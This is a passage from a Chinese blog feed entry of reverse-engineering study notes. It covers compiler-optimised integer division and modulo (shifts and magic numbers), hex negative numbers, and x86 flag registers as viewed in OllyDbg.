title="整数的除法"></a>整数的除法</h3><ol><li>有符号数，除数为2^n<br>x&gt;=0,x/2^n=x&gt;&gt;n<br>x<0,x/2^n=（x+（2^n-1））>&gt;n<br>除数为-2^n时最后用’neg 寄存器’指令求补  </li><li>有符号数，除数为正，非2^n<br>32位：x&gt;=0,result=(x<em>c&gt;&gt;32)+x&gt;&gt;n,<0时结果再+1  64位：x>=0,result=(x</em>c&gt;&gt;64)+x&gt;&gt;n,&lt;0时结果再+1  </li><li>有符号数，除数为负，非2^n<br>32位：x&gt;=0,result=(x<em>c&gt;&gt;32)-x&gt;&gt;n,<0时结果再+1  64位：x>=0,result=(x</em>c&gt;&gt;64)-x&gt;&gt;n,&lt;0时结果再+1  </li></ol><ul><li>c为魔数  </li></ul><ol><li>无符号数，除数位2^n<br>用shr右移</li><li>无符号数，除数非2^n<br>32位：x&gt;=0,result=x<em>c&gt;&gt;32&gt;&gt;n<br>62位：x&gt;=0,result=x</em>c&gt;&gt;62&gt;&gt;n</li></ol><h2 id="整数取模"><a href="#整数取模" class="headerlink" title="整数取模"></a>整数取模</h2><p>可以用除法指令，但是除法指令执行周期较长，通常优化将其转换成位运算或除法运算，再用除法运算进行优化  </p><ol><li>除数b=2^n<br>取得被除数二进制数的最后n位，负数要在n位之前补1：<br>x&gt;=0,result=x&amp;(b-1);x&lt;0,result=(x&amp;(b-1))-1|(~b-1)+1</li><li>除数b!=2^n<br>采用“余数=被除数-商<em>除数”<br>result=x-x/b</em>b</li></ol><h1 id="使用-OllyDbg-从零开始-Cracking"><a href="#使用-OllyDbg-从零开始-Cracking" class="headerlink" title="使用 OllyDbg 从零开始 Cracking"></a>使用 OllyDbg 从零开始 Cracking</h1><h2 id="数制系统"><a href="#数制系统" class="headerlink" title="数制系统"></a>数制系统</h2><p>十六进制负数  </p><p>从00000000~FFFFFFFF<br>正数：00000000~7FFFFFFF<br>负数：80000000~FFFFFFFF(-1)<br>在od左下角的commandbar可查询十六进制数的十进制值和对应的ASCII字符：<u>? [十六进制值]</u></p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p><img src="https://s1.ax1x.com/2020/04/02/GGxsMQ.png" alt=" "></p><ol><li><p>o，溢出标志<br>记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0  </p></li><li><p>p，奇偶标志<br>指令的结果用二进制表示时1的总数，如果为偶数PF=1，如果不为偶数PF=0</p></li><li>z，零标志<br>记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0  </li><li>s，符号标志<br>运算结果为负设置为1，结果为正设置为0  </li><li>c，进位标志<br>记录了无符号运算的结果是否有向更高位的进位（9位），有置1，无置0  </li><li>其他</li></ol><h1 id="python爬虫学习"><a href="#python爬虫学习" class="headerlink" title="python爬虫学习"></a>python爬虫学习</h1><p><a href="https://brubbish.github.io/710f8e5f.html##正则表达式">https://brubbish.github.io/710f8e5f.html##正则表达式</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;32位软件逆向技术&quot;&gt;&lt;a href=&quot;#32位软件逆向技术&quot; class=&quot;headerlink&quot; title=&quot;32位软件逆向技术&quot;&gt;&lt;/a&gt;32位软件逆向技术&lt;/h1&gt;&lt;h2 id=&quot;控制语句&quot;&gt;&lt;a href=&quot;#控制语句&quot; class=&quot;headerlink&quot; title=&quot;控制语句&quot;&gt;&lt;/a&gt;控制语句&lt;/h2&gt;&lt;h3 id=&quot;条件设置指令（SETcc）&quot;&gt;&lt;a href=&quot;#条件设置指令（SETcc）&quot; class=&quot;headerlink&quot; title=&quot;条件设置指令（SETcc）&quot;&gt;&lt;/a&gt;条件设置指令（SETcc）&lt;/h3&gt;&lt;p&gt;条件设置指令的形式是“SET&lt;u&gt;cc&lt;/u&gt; r/m8”， r/m8表示8位寄存器或单字节内存单元&lt;br&gt;条件设置指令测试一些标志位，把结果记录的目标操作数中&lt;br&gt;测试：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;of（=1溢出）&lt;/li&gt;
&lt;li&gt;zf（=1操作后等于0/相等）&lt;/li&gt;
&lt;li&gt;cf（=1进位/低于）&lt;/li&gt;
&lt;li&gt;cf、zf结合判断&lt;/li&gt;
&lt;li&gt;sf（=1操作后结果为负）&lt;/li&gt;
&lt;li&gt;pf（=1，1个数为偶数）&lt;/li&gt;
&lt;li&gt;sf、of结合判断（=1小于）&lt;/li&gt;
&lt;li&gt;zf（=1或zf!=of，不大于）&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8&quot;&gt;https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="周报" scheme="https://brubbish.github.io/tags/%E5%91%A8%E6%8A%A5/"/>
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
</feed>
